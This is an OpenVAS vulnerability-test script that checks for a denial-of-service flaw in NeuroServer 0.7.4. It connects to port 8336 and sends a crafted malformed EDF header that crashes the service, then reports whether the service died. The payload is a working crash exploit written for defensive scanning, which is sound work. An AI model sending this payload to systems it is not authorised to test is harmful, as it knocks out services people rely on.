###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_neuroserver_denial_of_service_vuln.nasl 11423 2018-09-17 07:35:16Z cfischer $
#
# NeuroServer Remote Denial of Service Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805953");
  script_version("$Revision: 11423 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 09:35:16 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-08-17 12:16:49 +0530 (Mon, 17 Aug 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("NeuroServer Remote Denial of Service Vulnerability");

  script_tag(name:"summary", value:"The host is running NeuroServer and is
  prone to denial of service vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request and check whether
  it is able to crash the application or not.");

  script_tag(name:"insight", value:"The error exists due to no validation of
  the EDF header allowing malformed header to crash the application.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"NeuroServer version 0.7.4");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37759");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/133025");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(8336);

  exit(0);
}

neuroPort = 8336;
if(!get_port_state(neuroPort)){
  exit(0);
}

neuroSock = open_sock_tcp(neuroPort);
if(!neuroSock){
  exit(0);
}

send(socket:neuroSock, data:'eeg\r\n');
Recv = recv(socket:neuroSock, length:16);

if("200 OK" >< Recv)
{
  crafteddata = string("setheader 0             OpenVASTest                ",
                       "                   07.04.1520.55.28768     EDF+C El",
                       "ectrode       EDF Annotations                      ",
                       "                                                   ",
                       "                                                   ",
                       "                 \r\n");


  send(socket:neuroSock, data:crafteddata);

  close(neuroSock);
  sleep(4);

  neuroSock1 = open_sock_tcp(neuroPort);
  if(!neuroSock1)
  {
    security_message(neuroPort);
    exit(0);
  }else
  {
    close(neuroSock1);
    exit(0);
  }
}
